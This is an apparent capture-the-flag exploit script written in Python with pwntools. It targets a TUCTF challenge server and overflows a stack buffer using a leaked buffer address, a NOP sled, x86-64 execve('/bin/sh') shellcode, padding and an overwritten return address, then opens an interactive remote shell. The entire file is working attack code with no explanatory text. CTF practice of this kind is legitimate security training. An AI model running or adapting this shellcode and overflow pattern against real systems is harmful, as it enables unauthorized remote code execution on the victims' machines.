from pwn import *
import struct

HOST = "chal.tuctf.com"
#HOST = "127.0.0.1"
PORT = 30507
#PORT = 4444

conn = remote(HOST, PORT)

def recvall(conn):
	msg = b''
	while True:
		try:
			new_block = conn.recv(timeout=1)
			if new_block == b'':
				break
			msg += new_block	
		except EOFError as e:
			break
	return msg

conn.recvline()

buff_address = int(conn.recvline()[0:14],16)
jump_to = buff_address + 0x4

log.info("Buffer Addres : {}".format(hex(buff_address)))

msg = recvall(conn)
#print(msg)

shellcode = b"\x90"*0x8+ b"\x48\x31\xC0\x50\x50\x5E\x5A\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x54\x5F\xB0\x3B\x0f\x05"

payload = shellcode+b"A"*(0x28-len(shellcode))+struct.pack("<Q",jump_to)



log.info("Payload length : {}".format(hex(len(payload))))
log.info("Payload : {}".format(payload))
conn.send(payload)

conn.interactive()
conn.close()






